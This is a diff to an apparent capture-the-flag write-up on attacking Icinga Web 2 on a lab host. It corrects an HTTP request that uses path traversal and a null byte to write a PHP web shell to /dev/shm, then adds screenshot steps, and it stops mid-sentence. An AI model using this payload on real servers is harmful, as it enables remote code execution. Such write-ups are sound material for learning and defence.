@@ -122,6 +122,14 @@ Connection: close
 Referer: http://icinga.cerberus.local:8080/icingaweb2/config/resource
 Cookie: Icingaweb2=s6tieh9hvacggibekoo9agmbio; icingaweb2-session=1679769643; icingaweb2-tzo=3600-0
 
-type=ssh&name=shell.php&user=..%2F..%2F..%2F..%2F..%2F..%2Fdev%2Fshm%2Fshell.php&private_key=file%3A%2F%2F%2Fetc%2Ficingaweb2%2Fssh%2Fhaxor00%3C%3Fphp+system(%24_REQUEST%5B'cmd'%5D)%3B%3F%3E&formUID=form_config_resource&CSRFToken=1379352477%7C91ede291a5bb76a464f88529cfe972d032c01b5fc8c9f06893f8ccc7de5e639b&btn_submit=Save+Changes
+type=ssh&name=shell.php&user=..%2F..%2F..%2F..%2F..%2F..%2Fdev%2Fshm%2Fshell.php&private_key=file%3A%2F%2F%2Fetc%2Ficingaweb2%2Fssh%2Fhaxor%00%3C%3Fphp+system(%24_REQUEST%5B'cmd'%5D)%3B%3F%3E&formUID=form_config_resource&CSRFToken=1379352477%7C91ede291a5bb76a464f88529cfe972d032c01b5fc8c9f06893f8ccc7de5e639b&btn_submit=Save+Changes
 ```
+
+Now we change it the path to /dev
+![image](https://user-images.githubusercontent.com/127159644/227735770-bbb095d5-315f-47a9-898f-a0a0e3d3b8b4.png)
+
+Next thing is to enable shm mode
+![image](https://user-images.githubusercontent.com/127159644/227735853-2288030a-b8cf-41ae-b450-7f3c6adb7d75.png)
+
+After that we can then verify by checking 
 
